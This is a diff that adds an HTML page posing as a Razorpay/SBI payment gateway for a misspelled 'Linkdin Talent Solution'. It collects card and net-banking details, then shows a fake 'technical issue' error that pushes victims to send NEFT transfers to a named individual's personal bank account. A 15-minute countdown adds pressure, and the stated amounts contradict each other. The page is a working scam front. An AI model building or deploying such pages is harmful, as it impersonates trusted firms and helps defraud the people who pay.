@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        /* Header */
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            background-color: #fff;
+        }
+
+        .header img {
+            height: 115px;
+        }
+
+        .notification {
+            color: red;
+            font-size: 14px;
+           padding: 15px;
+           margin: auto;
+        }
+
+        /* Navbar */
+        .navbar {
+            background-color: #1f1a69;
+            padding: 15px;
+            color: white;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        .navbar h3 {
+            margin: 0;
+        }
+
+        /* Main Container */
+        .main-container {
+            display: flex;
+            margin: 20px;
+        }
+
+        .payment-methods {
+            width: 30%;
+            background-color: #f4f4f4;
+            border-right: 1px solid #ccc;
+            padding: 20px;
+        }
+
+        .payment-methods h3 {
+            margin-bottom: 15px;
+        }
+
+        .payment-methods button {
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            transition: background-color 0.3s;
+        }
+
+        .payment-methods button:hover {
+            background-color: #e6e6e6;
+        }
+
+        .payment-details {
+            width: 70%;
+            padding: 20px;
+        }
+
+        .payment-details input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .payment-details button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1f1a69;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .payment-details button:hover {
+            background-color: #1f1a69;
+        }
+
+        .order-summary {
+            width: 30%;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            margin-left: 20px;
+        }
+
+        .order-summary h3 {
+            margin-bottom: 15px;
+        }
+
+        .order-summary p {
+            margin: 5px 0;
+        }
+
+        .visible {
+            display: block;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .footer-messageS {
+            margin-top: 20px;
+            text-align: center;
+            color: red;
+            font-weight: bold;
+        }
+        
+        .yaxis-logo{
+    height: 80px; /* Adjust height as needed */
+    margin-left: auto; /* Push the logo to the right */
+}
+
+
+.neft-summary-container {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 15px;
+    padding: 25px;
+    border: 1px solid #ccc;
+    /* border-radius: 10px; */
+    background-color: #f9f9f9;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    width: 400px;
+    margin: 20px auto;
+}
+
+.neft-summary-container h3 {
+    font-size: 20px;
+    margin-bottom: 20px;
+    color: #333;
+}
+
+.neft-summary-container p {
+    font-size: 16px;
+    color: #555;
+}
+
+.neft-summary-container input {
+    padding: 10px;
+    width: 100%;
+    max-width: 300px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+
+.neft-summary-container button {
+    padding: 10px 20px;
+    background-color: #1f1a69;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    transition: background-color 0.3s ease;
+}
+
+.neft-summary-container button:hover {
+    background-color: #1f1a69;
+}  
+
+.timer {
+    font-size: 16px;
+    color: red;
+    margin-top: 10px;
+}
+
+
+
+.note {
+    text-align: center;
+    font-size: 18px;
+    color: #000000;
+    border-top: 3px solid #0000ff ;
+    border-bottom: 3px solid #0000ff; /* Light yellow background */
+    /* border: 1px solid #CCCCCC; */
+    /* padding: 10px; */
+    width: 80%;
+    margin: 0 auto;
+}
+
+
+
+
+  
+    </style>
+</head>
+<body>
+    
+    <div class="timer" id="timer">Complete your payment in: 15:00</div>
+    
+
+    <!-- Header Section -->
+    <div class="header">
+        <img src="razorpay-icon.webp" alt="SBI Logo">
+        <div class="notification">
+            <!-- Following channel(s) is/are unavailable during mentioned time:<br>
+            Bharat Bank (NB) From: 2024-07-05 17:45:13 To: 2025-07-31 23:59:59<br>
+            Janata Sahakari Bank Ltd. Pune (NB) From: 2024-02-14 19:19:50 To: 2025-12-31 23:59:59 -->
+        </div>
+        <img class="yaxis-logo" src="Linkdin2.png" alt="yaxis-logo">
+    </div>
+
+    <!-- <img src="/WhatsApp Image 2024-09-10 at 11.39.32_7dde61c2.jpg" alt="yaxis-logo"> -->
+
+    <!-- Blue Navbar -->
+    <div class="navbar">
+        <h3>Payment Details</h3>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Payment Methods Sidebar -->
+        <div class="payment-methods">
+            <h3>Payment Methods</h3>
+            <button onclick="showPaymentForm('debit-credit-card')">Debit/Credit Card</button>
+            <button onclick="showPaymentForm('net-banking')">Internet Banking</button>
+            <button onclick="showPaymentForm('upi')">UPI</button>
+            <button onclick="showPaymentForm('neft')">NEFT</button>
+            <button onclick="showPaymentForm('sbi-branch')">SBI Branch</button> <!-- New SBI Branch Button -->
+        </div>
+
+        <!-- Payment Form Area -->
+        <div class="payment-details">
+            <!-- Debit/Credit Card Payment Form -->
+            <div id="debit-credit-card" class="hidden">
+                <h3>Debit/Credit Card Payment</h3>
+                <label for="card-number">Card Number *</label>
+                <input type="text" id="card-number" placeholder="Enter your card number" required><br>
+                <label for="expiry-date">Expiry Date *</label>
+                <input type="text" id="expiry-date" placeholder="MM/YY" required><br>
+                <label for="cvv">CVV *</label>
+                <input type="text" id="cvv" placeholder="Enter CVV" required><br>
+                <label for="cardholder-name">Cardholder Name *</label>
+                <input type="text" id="cardholder-name" placeholder="Enter the cardholder's name" required><br>
+                <button type="submit">Pay Now</button>
+            </div>
+
+            <!-- Net Banking Payment Form -->
+            <div id="net-banking" class="hidden">
+                <h3>Internet Banking</h3>
+                <label for="account-number">Account Number *</label>
+                <input type="text" id="account-number" placeholder="Enter your account number" required><br>
+                <label for="cif-number">CIF Number *</label>
+                <input type="text" id="cif-number" placeholder="Enter your CIF number" required><br>
+                <label for="branch-code">Branch Code *</label>
+                <input type="text" id="branch-code" placeholder="Enter your branch code" required><br>
+                <label for="country">Country *</label>
+                <input type="text" id="country" placeholder="Enter your country" required><br>
+                <label for="mobile-number">Mobile Number *</label>
+                <input type="text" id="mobile-number" placeholder="Enter your mobile number" required><br>
+                <button type="submit">Pay Now</button>
+            </div>
+
+            <!-- UPI Payment Form -->
+            <div id="upi" class="hidden">
+                <h3>UPI Payment</h3>
+                <label for="upi-id">UPI ID *</label>
+                <input type="text" id="upi-id" placeholder="Enter your UPI ID" required><br>
+                <button type="submit">Pay Now</button>
+            </div>
+
+            <!-- NEFT Payment Form -->
+            <div id="neft" class="hidden">
+                <h3>Pay now using with these NEFT payment details</h3>
+                <p><strong>Name:</strong> PRADEEP KUMAR</p>
+                <p><strong>Account no.:</strong> 1846000102290971</p>
+                <p><strong>Bank name:</strong> PUNJAB NATIONAL BANK</p>
+                <p><strong>Bank IFSC:</strong> PUNB0184600</p>
+                
+                <!-- <button onclick="populateSummary()">Pay Now</button> -->
+                <button id="pay-now-btn">Proceed After Payment</button>
+            </div>
+
+           
+
+            <!-- SBI Branch Payment Form -->
+            <div id="sbi-branch" class="hidden"> <!-- New SBI Branch Payment Form -->
+                <h3>SBI Branch Payment</h3>
+                <p><strong>Visit the nearest SBI Branch and provide the following details:</strong></p>
+                <p><strong>Merchant Name:</strong>Linkdin talent solution</p>
+                <p><strong>Order No.:</strong> 202409211635163771</p>
+                <p><strong>Amount:</strong> 369.00 INR</p>
+                <p><strong>Account Number:</strong> 1234567890</p>
+                <p><strong>Branch IFSC:</strong> SBIN0000123</p>
+                <button type="submit">Proceed After Payment</button>
+            </div>
+
+        </div>
+
+        <!-- Order Summary -->
+        <div class="order-summary">
+            <h3>Order Summary</h3>
+            <p><strong style="color: red;">Kindly note Order No.</strong></p>
+            <p><strong>Order No.:</strong> <span style="color: green;">2024092116351</span></p>
+            <p><strong>Merchant Name:</strong>Linkdin Talent Solution </p>
+            <p><strong>Amount:</strong> 4354.00 INR</p>
+            <p><strong>Processing fee:</strong> 12.71 INR</p>
+            <p><strong>GST:</strong> 783.72 INR</p>
+            <p><strong>Total:</strong> 5137.64 INR</p>
+        </div>
+    </div>
+    
+    <!---->
+   
+    <!-- NEFT Summary Container -->
+<div class="neft-summary-container" style="display: none; justify-content: center; align-items: center; flex-direction: column; gap: 10px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9;">
+    <h3>Verify Your Payment Details :</h3>
+    
+    <!-- Reference No. Input Box -->
+    <p><strong>Reference No / Transaction ID: </strong></p>
+    <input type="text" id="neft-ref-no-box" placeholder="Reference No / Transaction ID:" style="padding: 8px; width: 200px;">
+    
+    <!-- Payment ID Input Box -->
+    <!-- <p><strong>Payment ID:</strong></p>
+    <input type="text" id="neft-payment-id-box" placeholder="Enter Payment ID" style="padding: 8px; width: 200px;"> -->
+    
+    <!-- Transaction ID Input Box -->
+    <!-- <p><strong>Transaction ID:</strong></p>
+    <input type="text" id="neft-trans-id-box" placeholder="Enter Transaction ID" style="padding: 8px; width: 200px;"> -->
+    
+    <!-- Final Amount Input Box -->
+    <p><strong>Final Amount:</strong></p>
+    <input type="text" id="final-amount-box" placeholder="Enter Final Amount" value="" style="padding: 8px; width: 200px;">
+    
+    <!-- Payment Status -->
+    <p><strong>Status:</strong> Pending</p>
+
+    <button onclick="populateSummary()">VERIFY</button>
+</div>
+
+
+
+<div class="note">
+    NOTE: TO MAKE PAYMENT VIA NEFT USE YOUR BANK APPLICATION OR PAYMENT APP (PAYTM, PHONE PE)
+    </div>
+
+    
+
+    <!-- Error Message -->
+    <div class="footer-messageS">
+        Error: Due to Technical issue payment are not accepted via credit/debit cards or Net Banking or UPI Please pay using NEFT for payments.
+    </div>
+
+    
+
+    <script>
+        function showPaymentForm(formId) {
+            const forms = ['debit-credit-card', 'net-banking', 'upi', 'neft', 'sbi-branch']; // Added 'sbi-branch'
+            forms.forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(formId).classList.remove('hidden');
+        }
+    
+        // Automatically show the first payment method on page load
+        window.onload = function() {
+            showPaymentForm('debit-credit-card'); // Default payment form
+        }
+         
+          
+     
+     // Show the NEFT summary container when "Pay Now" button is clicked
+document.getElementById('pay-now-btn').addEventListener('click', function() {
+    document.querySelector('.neft-summary-container').style.display = 'flex';
+});
+
+// Function to populate the summary fields with dummy data
+function populateSummary() {
+    // const referenceNo = 'REF' + Math.floor(Math.random() * 1000000000);
+    // const paymentID = 'PAY' + Math.floor(Math.random() * 1000000);
+    // const transactionID = 'TRANS' + Math.floor(Math.random() * 1000000000);
+    // const finalAmount = '369.00 INR';
+
+    // document.getElementById('neft-ref-no-box').value = referenceNo;
+    // document.getElementById('neft-payment-id-box').value = paymentID;
+    // document.getElementById('neft-trans-id-box').value = transactionID;
+    // document.getElementById('final-amount-box').value = finalAmount;
+   
+}
+  
+
+
+    // Show the NEFT summary container when "Pay Now" button is clicked
+document.getElementById('pay-now-btn').addEventListener('click', function() {
+    // Show the NEFT summary container
+    document.querySelector('.neft-summary-container').style.display = 'flex';
+});
+
+// Function to populate the summary fields with dummy data
+function populateSummary() {
+    // // Generate random data for the fields
+    // const referenceNo = 'REF' + Math.floor(Math.random() * 1000000000);
+    // const paymentID = 'PAY' + Math.floor(Math.random() * 1000000);
+    // const transactionID = 'TRANS' + Math.floor(Math.random() * 1000000000);
+    // const finalAmount = '369.00 INR';
+
+    // // Populate the input fields with the generated data
+    // document.getElementById('neft-ref-no-box').value = referenceNo;
+    // document.getElementById('neft-payment-id-box').value = paymentID;
+    // document.getElementById('neft-trans-id-box').value = transactionID;
+    // document.getElementById('final-amount-box').value = finalAmount;
+}
+    
+    
+// timer bc
+
+let timeInSeconds = 900;
+
+function updateTimer() {
+    let minutes = Math.floor(timeInSeconds / 60);
+    let seconds = timeInSeconds % 60;
+
+    // Add leading zero for seconds if it's less than 10
+    seconds = seconds < 10 ? '0' + seconds : seconds;
+
+    // Update the timer on the page
+    document.getElementById("timer").textContent = `Complete your payment in: ${minutes}:${seconds}`;
+
+    // If time runs out, trigger the payment completion
+    if (timeInSeconds <= 0) {
+        completePayment();
+        clearInterval(timerInterval); // Stop the timer
+    } else {
+        timeInSeconds--;
+    }
+}
+
+function completePayment() {
+    // Your payment completion logic goes here
+    alert("Time's up! Payment is failed.");
+}
+
+// Update the timer every second
+let timerInterval = setInterval(updateTimer, 1000);
+
+
+
+function populateSummary() {
+    // Redirect to a new HTML page
+    window.location.href = 'confirmation.html'; // Replace 'confirmation.html' with the actual path to your new page
+}
+
+
+    </script>
+    
+
+</body>
+</html>
